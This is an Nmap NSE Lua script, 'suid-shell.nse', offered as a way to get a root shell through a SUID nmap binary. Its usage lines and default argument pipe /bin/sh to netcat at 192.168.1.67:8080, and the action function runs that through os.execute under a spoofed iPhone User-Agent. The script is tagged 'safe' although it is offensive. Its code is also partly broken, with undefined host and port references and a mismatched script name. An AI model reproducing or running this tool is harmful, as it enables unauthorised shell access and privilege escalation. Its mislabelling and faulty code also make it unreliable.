---
-- Nmap NSE suid-shell.nse - Version 1.1
-- Copy script to: /usr/share/nmap/scripts/file-checker.nse
-- Update db: sudo nmap --script-updatedb
-- executing: nmap --script-help file-checker.nse
---


-- SCRIPT BANNER DESCRIPTION --
description = [[

Author: Maky, r00t-3xp10it
NSE script to Get Root Shell on SUID Nmap :)

Some Syntax examples:
nmap --script-help suid-shell.nse
nmap -sS -Pn -p 8080 --script suid-shell.nse <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh | 192.168.1.67 8080" <target or domain>

]]


---
-- @usage
-- nmap --script-help suid-shell.nse
-- nmap -sS -Pn -p 8080 --script suid-shell.nse <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh | 192.168.1.67 8080" <target or domain>
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | suid-shell:
-- |   module author: r00t-3xp10it
-- |   netcat shell : executed sucessefully ..
-- |_
-- @args user.command   -> The command to be executed -> Default: /bin/sh | nc 192.168.1.67 8080
-- @args fakeUser.agent -> The User-agent to send in header request -> Default: iPhone,safari
---

author = "Maky, r00t-3xp10it"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}



-- DEPENDENCIES (lua nse libraries) --
local http = require "http"
local stdnse = require ('stdnse')
local shortport = require "shortport"
local os = require "os"


  -- THE RULE SECTION --
  portrule = shortport.http
  local command = stdnse.get_script_args(SCRIPT_NAME..".command") or "/bin/sh | nc "..host.." "..port..""


-- THE ACTION SECTION --
action = function(host, port, command)
local options = {header={}}   --> manipulate 'header' request ..
options['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".agent") or "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_4 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B350 Safari/8536.25" --> use iPhone,safari User-agent OR your own...
options['header']['Accept-Language'] = "en-GB,en;q=0.8,sv" --> use en-GB as attacker default install language
options['header']['Cache-Control'] = "no-store" -->  Instruct webserver to not write it to disk (do not to cache it)
  -- execute command (args)
  os.execute(""..command.."")
  return "\n  module author: r00t-3xp10it\n  netcat shell : executed sucessefully ..\n"
end
